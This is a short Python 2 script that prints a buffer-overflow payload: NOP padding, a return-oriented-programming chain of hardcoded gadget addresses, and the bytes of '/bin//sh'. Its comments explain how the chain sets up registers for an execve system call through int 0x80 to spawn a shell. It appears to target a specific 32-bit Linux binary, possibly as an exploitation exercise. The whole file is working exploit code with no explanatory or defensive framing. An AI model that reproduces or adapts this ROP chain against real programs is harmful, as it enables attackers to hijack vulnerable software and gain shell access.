from struct import pack

print '\x90' * 112 +\
    pack("<I", 0x0804cf26) + pack("<I", 0x11111111) +\
    pack("<I", 0x0805733a) + pack("<I", 0xbffef4d8) +\
    pack("<I", 0x080497d2) +\
    (pack("<I", 0x08050bbc) + pack("<I", 0x11111111)) * 11 +\
    pack("<I", 0x08057360) + pack("<I", 0xbffef4f0) +\
    pack("<I", 0xbffef4ec) + pack("<I", 0xbffef4f4) +\
    pack("<I", 0x08057ae0) +\
    pack("<I", 0xbffef4f4) + pack("<I", 0x22222222) + \
    pack("<I", 0x6e69622f) + pack("<I", 0x68732f2f) + '\x00' * 4
# set eax to 0
# set edx to zero word - 24
# EDX+24 set to 0
# inc eax 11 times
# pop edx, pop ecx, pop ebx
# int 0x80
# shell command
